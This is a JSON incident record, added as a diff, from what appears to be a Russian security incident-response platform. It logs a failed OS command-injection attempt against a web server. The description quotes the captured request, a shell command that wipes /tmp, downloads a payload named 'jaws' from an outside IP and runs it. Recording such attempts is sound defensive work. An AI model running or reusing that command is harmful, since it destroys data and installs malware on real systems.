@@ -1,0 +1,237 @@
+{
+    "@sensor_additional_information": [
+        {
+            "inn": "",
+            "host_id": "",
+            "org_name": "",
+            "home_net": "",
+            "geo_code": "",
+            "sensor_id": "8030125",
+            "subject_rf": "",
+            "object_area": "",
+            "full_org_name": ""
+        },
+        {
+            "inn": "",
+            "host_id": "",
+            "org_name": "",
+            "home_net": "",
+            "geo_code": "",
+            "sensor_id": "8",
+            "subject_rf": "",
+            "object_area": "",
+            "full_org_name": ""
+        }
+    ],
+    "@ip_addresses_additional_information": [
+        {
+            "ip": "58.3.134.126",
+            "city": "",
+            "country": "",
+            "country_code": ""
+        },
+        {
+            "ip": "144.206.94.12",
+            "city": "",
+            "country": "",
+            "country_code": ""
+        },
+        {
+            "ip": "127.0.0.1",
+            "city": "",
+            "country": "",
+            "country_code": ""
+        },
+        {
+            "ip": "167.71.210.63",
+            "city": "",
+            "country": "",
+            "country_code": ""
+        }
+    ],
+    "@special_uuid": "ce1c58b1-98a3-4ac4-a90c-3c797f7e1e3f",
+    "tags": [
+        {
+            "name": "ats:reason=\"sigma:exploit attempts\"",
+            "color": "#DCDCDC",
+            "created": "2026-08-13T19:03:44+03:00",
+            "created_by": {
+                "username": "admin@bi.zone",
+                "id": 1
+            },
+            "is_visible_for_customer": false
+        },
+        {
+            "name": "ats:reason=\"sigma:os commanding\"",
+            "color": "#DCDCDC",
+            "created": "2026-08-13T19:03:44+03:00",
+            "created_by": {
+                "username": "admin@bi.zone",
+                "id": 1
+            },
+            "is_visible_for_customer": false
+        },
+        {
+            "name": "processed:2026-11-02",
+            "color": "#2196F3",
+            "created": "2026-11-02T09:39:41+03:00",
+            "created_by": {
+                "username": "n8n_adding_info@cert.gov.ru",
+                "id": 8
+            },
+            "is_visible_for_customer": false
+        },
+        {
+            "name": "rule:osc_rce",
+            "color": "#FF6B6B",
+            "created": "2026-10-30T18:42:03+03:00",
+            "created_by": {
+                "username": "n8n_adding_info@cert.gov.ru",
+                "id": 8
+            },
+            "is_visible_for_customer": false
+        },
+        {
+            "name": "sensor:8030125",
+            "color": "#9C27B0",
+            "created": "2026-11-02T09:50:53+03:00",
+            "created_by": {
+                "username": "n8n_adding_info@cert.gov.ru",
+                "id": 8
+            },
+            "is_visible_for_customer": false
+        },
+        {
+            "name": "source:siem",
+            "color": "#4CAF50",
+            "created": "2026-09-17T19:30:22+03:00",
+            "created_by": {
+                "username": "n8n_adding_info@cert.gov.ru",
+                "id": 8
+            },
+            "is_visible_for_customer": false
+        }
+    ],
+    "watchers": [
+        {
+            "email": "",
+            "last_name": "",
+            "username": "",
+            "first_name": "",
+            "patronimic": "",
+            "id": 0,
+            "is_active": false
+        }
+    ],
+    "observed_iocs": [
+        {
+            "category": [
+                "Malware"
+            ],
+            "ioc": "58.3.134.126",
+            "ioc_type": "ipv4"
+        }
+    ],
+    "secondary_category_ref": [
+        {
+            "id": "Vuln_Exploit_Attempt",
+            "title": "Попытки эксплуатации уязвимости",
+            "description": ""
+        },
+        {
+            "id": "Vuln_Exploited",
+            "title": "Успешная эксплуатация уязвимости",
+            "description": ""
+        }
+    ],
+    "keyfield": null,
+    "activity_detected": null,
+    "platform_hostname": [
+        "DFL"
+    ],
+    "secondary_category": [
+        "Vuln_Exploit_Attempt",
+        "Vuln_Exploited"
+    ],
+    "detection_rules": [
+        23
+    ],
+    "emls": null,
+    "slas": null,
+    "badges": null,
+    "watchers_id": null,
+    "attachments": null,
+    "parsed_activity_detected": null,
+    "issue_type_ref": {
+        "id": "Incident",
+        "title": "Incident",
+        "description": ""
+    },
+    "primary_category_ref": {
+        "id": "Vuln_Exploited",
+        "title": "Успешная эксплуатация уязвимости",
+        "description": ""
+    },
+    "resolution_name_ref": {
+        "id": "",
+        "title": "",
+        "description": ""
+    },
+    "created": "2026-11-02T12:09:39+03:00",
+    "updated": "2026-11-02T12:13:02+03:00",
+    "timestamp": "2026-11-02T12:13:02+03:00",
+    "updated_all": "2026-11-02T12:13:02+03:00",
+    "detection_date": "2026-10-31T13:52:47+03:00",
+    "first_sent_notification_time": "",
+    "key": "INC-2105",
+    "status": "Новый",
+    "summary": "Зафиксирована OS commanding с 58.3.134.126",
+    "tenant_id": "8030125",
+    "priority": "Medium",
+    "issue_type": "Incident",
+    "description": "<p>Вердикт: UNSUCCESSFUL<br> Уверенность: 1.0<br> Почему: В http_response нет вывода команды. В http_uri есть команда, но сервер её не выполнил (HTTP 404).<br> Тип алерта: OSC_RCE<br> Атака: OS command injection: в запросе оболочечная команда</p> <p>Источник: 58.3.134.126<br> Цель: 144.206.94.12<br> Алерт: fecca7b1-9f9b-4a4f-9f2e-ae842ba3cdd8<br> Поиск Arkime: http: //anisimova.cloud.gcm:8005/sessions?startTime=1793439545&amp;stopTime=1793441345&amp;expression=ip == 58.3.134.126 &amp;&amp; ip == 144.206.94.12</p> <p>Вредоносные запросы:<br> Запрос 1: 58.3.134.126: 56505 -&gt; 144.206.94.12: 80<br> Сессия: 3@261031-zrQKMtwyM6tAiYlHycBLQ_wf<br> Запрос: -<br> HTTP статус: -<br> Ответ сервера: -<br> Arkime: http: //anisimova.cloud.gcm:8005/sessions?expression=id==3%40261031-zrQKMtwyM6tAiYlHycBLQ_wf<br> Запрос 2: 58.3.134.126: 48740 -&gt; 144.206.94.12: 80<br> Сессия: 3@261031-zrSepzQJ60tIY7wa88b4EMj5<br> Запрос: 127.0.0.1: 80/shell?cd /tmp;rm -rf *;wget 167.71.210.63/jaws;sh /tmp/jaws<br> HTTP статус: 404<br> Ответ сервера: HTTP/1.1 404 Not Found Server: nginx Date: Sat, 31 Oct 2026 09: 59: 05 GMT Content-Type: text/html Content-Length: 146 Connection: keep-alive 404 Not Found 404 Not Found nginx<br> Arkime: http: //anisimova.cloud.gcm:8005/sessions?expression=id==3%40261031-zrSepzQJ60tIY7wa88b4EMj5<br>",
+    "rendered_description": "<p>Вердикт: UNSUCCESSFUL<br> Уверенность: 1.0<br> Почему: В http_response нет вывода команды. В http_uri есть команда, но сервер её не выполнил (HTTP 404).<br> Тип алерта: OSC_RCE<br> Атака: OS command injection: в запросе оболочечная команда</p> <p>Источник: 58.3.134.126<br> Цель: 144.206.94.12<br> Алерт: fecca7b1-9f9b-4a4f-9f2e-ae842ba3cdd8<br> Поиск Arkime: http: //anisimova.cloud.gcm:8005/sessions?startTime=1793439545&amp;stopTime=1793441345&amp;expression=ip == 58.3.134.126 &amp;&amp; ip == 144.206.94.12</p> <p>Вредоносные запросы:<br> Запрос 1: 58.3.134.126: 56505 -&gt; 144.206.94.12: 80<br>  Сессия: 3@261031-zrQKMtwyM6tAiYlHycBLQ_wf<br> Запрос: -<br> HTTP статус: -<br> Ответ сервера: -<br> Arkime: http: //anisimova.cloud.gcm:8005/sessions?expression=id==3%40261031-zrQKMtwyM6tAiYlHycBLQ_wf<br> Запрос 2: 58.3.134.126: 48740 -&gt; 144.206.94.12: 80<br> Сессия: 3@261031-zrSepzQJ60tIY7wa88b4EMj5<br> Запрос: 127.0.0.1: 80/shell?cd /tmp;rm -rf *;wget 167.71.210.63/jaws;sh /tmp/jaws<br> HTTP статус: 404<br> Ответ сервера: HTTP/1.1 404 Not Found Server: nginx Date: Sat, 31 Oct 2026 09: 59: 05 GMT Content-Type: text/html Content-Length: 146 Connection: keep-alive 404 Not Found 404 Not Found nginx<br> Arkime: http: //anisimova.cloud.gcm:8005/sessions?expression=id==3%40261031-zrSepzQJ60tIY7wa88b4EMj5<br> Запрос 3: 58.3.134.126: 48750 -&gt; 144.206.94.12: 80<br> Сессия: 3@261031-zrTdvrLw78ZE_I8vYuBwoFOP<br> Запрос: -<br> HTTP статус: -<br> Ответ сервера: -<br> Arkime: http: anisimova.cloud.gcm: 8005/sessions?expression=id==3%40261031-zrTdvrLw78ZE_I8vYuBwoFOP</p>",
+    "status_description": "",
+    "assignee_displayName": "",
+    "reporter_displayName": "803.a.egorov@cert.gov.ru",
+    "creator_displayName": "803.a.egorov@cert.gov.ru",
+    "reporter_emailAddress": "gcm@cert.gov.ru",
+    "primary_category": "Vuln_Exploited",
+    "resolutiondate": "",
+    "resolution_name": "",
+    "resolution_detailed": "",
+    "platform_url": "http://anisimova.cloud.gcm:8005/sessions?expression=ip%20%3D%3D%20144.206.94.12%20%7C%7C%20ip%20%3D%3D%2058.3.134.126&date=8760",
+    "attack_type": "",
+    "gossopka_send_time": "",
+    "gti_send_time": "",
+    "customer_star_rating_comment": "",
+    "recommendations": "",
+    "affected_service": "",
+    "fake_as_path": "",
+    "fake_prefix": "",
+    "fp_type": "",
+    "looking_glass": "",
+    "spam_recipients": "",
+    "tlp": "amber",
+    "usual_prefix": "",
+    "usual_as_path": "",
+    "source": "SIEM",
+    "external_id": "",
+    "underline_source": "https://irp.cloud.gcm:443/api/v0/irp/issue/INC-2105/",
+    "gossopka_key": "",
+    "service": "",
+    "assignee": "",
+    "gti_id": "",
+    "customer_star_rating": "",
+    "gossopka_id": "",
+    "mitre_cov": "",
+    "response_team": "",
+    "gossopka_errors": "",
+    "gossopka_key_link": "",
+    "id": 105,
+    "system": 161,
+    "is_visible_for_customer": true,
+    "show_gossopka_button": false,
+    "cancel_gossopka_send_button": false,
+    "show_gti_button": false
+}
